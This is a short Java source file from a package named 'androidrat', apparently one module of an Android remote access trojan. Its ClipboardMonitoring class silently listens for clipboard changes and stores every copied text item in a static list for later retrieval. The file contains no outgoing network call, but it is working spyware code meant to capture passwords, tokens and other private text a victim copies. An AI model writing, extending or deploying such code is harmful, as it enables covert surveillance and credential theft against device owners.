package com.ot.androidrat;

import static android.content.Context.CLIPBOARD_SERVICE;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;

import org.json.JSONObject;

import java.util.ArrayList;

public class ClipboardMonitoring {

    Context context;
    static ArrayList<String> data = new ArrayList<String>();

    public  ClipboardMonitoring(Context context) {
        this.context = context;
    }

    public ArrayList<String> getClipData() {
        ClipboardManager clipBoard = (ClipboardManager) this.context.getSystemService(CLIPBOARD_SERVICE);
        clipBoard.addPrimaryClipChangedListener(new ClipboardManager.OnPrimaryClipChangedListener() {

            @Override
            public void onPrimaryClipChanged() {
                ClipData clipData = clipBoard.getPrimaryClip();
                ClipData.Item item = clipData.getItemAt(0);
                data.add(item.getText().toString());
            }
        });
        return data;
    }
}
